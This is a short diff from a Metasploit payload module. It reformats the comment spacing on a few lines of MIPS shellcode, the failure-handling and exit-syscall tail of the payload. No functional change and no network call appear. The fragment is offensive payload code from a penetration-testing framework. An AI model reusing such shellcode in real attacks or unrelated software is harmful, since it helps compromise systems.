@@ -104,11 +104,11 @@ module MetasploitModule
             "\x8f\xb2\xff\xfc" +  #  lw  s2,-4(sp)
             "\x02\x20\xf8\x09" +  #  jalr    s1
             # 4006bc <failed>:
-            "\x24\x04\x00\x01" +	#  li	a0,1
-            "\x24\x02\x0f\xa1" +	#  li	v0,4001
+            "\x24\x04\x00\x01" +  #  li	a0,1
+            "\x24\x02\x0f\xa1" +  #  li	v0,4001
             # exit(status)
-            "\x01\x01\x01\x0c" +	#  syscall	0x40404
-            "\x00\x20\x08\x25" +	#  move	at,at
+            "\x01\x01\x01\x0c" +  #  syscall	0x40404
+            "\x00\x20\x08\x25" +  #  move	at,at
             "\x00\x20\x08\x25"    #  move	at,at
         }
       ))
